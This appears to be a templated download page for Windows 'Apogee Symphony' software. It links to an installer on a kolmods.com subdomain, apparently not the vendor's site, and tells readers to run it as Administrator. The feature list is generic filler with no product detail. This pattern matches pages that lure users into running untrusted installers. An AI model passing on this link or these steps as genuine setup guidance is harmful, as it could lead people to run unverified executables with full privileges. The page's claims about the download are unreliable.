# Apogee Symphony Windows Setup Notes

**Download:** [Get Windows installer →](https://apogee-symphony-setup.kolmods.com/)

## Download & Install

> Setup notes for **Apogee Symphony** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Apogee Symphony** from the Start menu

## What you can use it for

- Core Apogee Symphony features on Windows desktop
- Install and configure Apogee Symphony for daily use
- Import, edit, and export with Apogee Symphony tools
- Tune settings and profiles inside Apogee Symphony
- Integrate Apogee Symphony into your existing workflow
